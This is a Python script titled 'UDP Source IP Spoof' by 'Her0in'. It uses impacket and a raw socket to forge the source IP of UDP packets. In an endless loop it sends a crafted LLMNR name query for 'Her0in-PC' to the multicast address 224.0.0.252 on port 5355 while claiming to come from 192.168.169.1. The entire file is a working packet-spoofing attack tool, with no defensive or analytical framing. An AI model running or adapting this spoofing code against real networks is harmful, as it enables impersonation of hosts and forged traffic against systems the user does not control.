#/usr/bin/env python

__doc__ = """

    UDP Source IP Spoof ,
                    by Her0in

"""

import socket, time
from impacket import ImpactDecoder, ImpactPacket

def UDPSpoof(src_ip, src_port, dst_ip, dst_port, data):
    ip = ImpactPacket.IP()
    ip.set_ip_src(src_ip)
    ip.set_ip_dst(dst_ip)

    udp = ImpactPacket.UDP()
    udp.set_uh_sport(src_port)
    udp.set_uh_dport(dst_port)

    udp.contains(ImpactPacket.Data(data))
    ip.contains(udp)

    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(ip.get_packet(), (dst_ip, dst_port))

if __name__ == "__main__":
    QueryData = (
        "\xa9\xfb"  # Transaction ID
        "\x00\x00"  # Flags Query(0x0000)? or Response(0x8000) ?
        "\x00\x01"  # Question
        "\x00\x00"  # Answer RRS
        "\x00\x00"  # Authority RRS
        "\x00\x00"  # Additional RRS
        "\x09"      # length of Name
        "Her0in-PC"    # Name
        "\x00"      # NameNull
        "\x00\x01"  # Query Type ,IPv4(0x0001)? or IPv6(0x001c)?
        "\x00\x01") # Class

    ip_src = "192.168.169.1"
    ip_dst = "224.0.0.252"

    while True:
        print("UDP Source IP Spoof %s => %s for Her0in-PC" % (ip_src, ip_dst))
        UDPSpoof(ip_src, 18743,ip_dst , 5355, QueryData)
        time.sleep(3)
